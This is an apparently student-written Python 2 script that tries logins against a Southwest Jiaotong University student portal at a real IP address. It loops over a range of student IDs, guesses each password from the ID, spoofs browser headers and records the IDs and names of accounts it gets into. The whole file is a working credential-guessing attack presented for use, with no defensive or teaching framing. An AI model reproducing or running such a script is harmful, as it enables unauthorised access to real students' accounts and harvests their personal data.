#coding:utf-8
import urllib
import urllib2
import cookielib
import re


#获取一个保存cookie的对象
cj = cookielib.LWPCookieJar()
#将一个保存cookie对象，和一个HTTP的cookie的处理器绑定
cookie_support = urllib2.HTTPCookieProcessor(cj)
#创建一个opener，将保存了cookie的http处理器，还有设置一个handler用于处理http的URL的打开
opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)
#将包含了cookie、http处理器、http的handler的资源和urllib2对象板顶在一起
urllib2.install_opener(opener)
listid = []
listname = []
print '-------------xzp西南交大密码系统-v1.0---------'
for id in range(20103001,20103500):
	userid = id
	password = id%1000000
	postdata = urllib.urlencode({
							"url":"../usersys/index.jsp",
        					"user_id":userid,
							"password":password,
							"user_style":"modern",
							"user_type":"student"
							})
	headers = {
			"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
			"Accept-Language":"zh-CN,zh;q=0.8",
			#"Cookie":"JSESSIONID=DDD846B55282851B03E91225808FDE83.worker2; user_id=20110097; user_type=student; user_style=modern",
			"Host":"202.115.67.2",
			"Origin":"http://202.115.67.2",
			"Referer":"http://202.115.67.2/service/login.jsp?user_type=student",
			"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36",
			}
	url = "http://202.115.67.2/servlet/UserLoginSQLAction"
	req = urllib2.Request(url,data=postdata)
	for n in headers:
		req.add_header(n,headers[n])
	html = urllib2.urlopen(req).read()
	output = re.findall("(?<=\s)\S+(?=\scontent=\"2;)",html)
	if len(output):
		listid.append(id)
		name = re.findall("(?<=<br>)\S+(?=.....)",html)
		listname.append(name[0])
for n in range(len(listid)):
	print listid[n]
	print listname[n].decode('gbk')


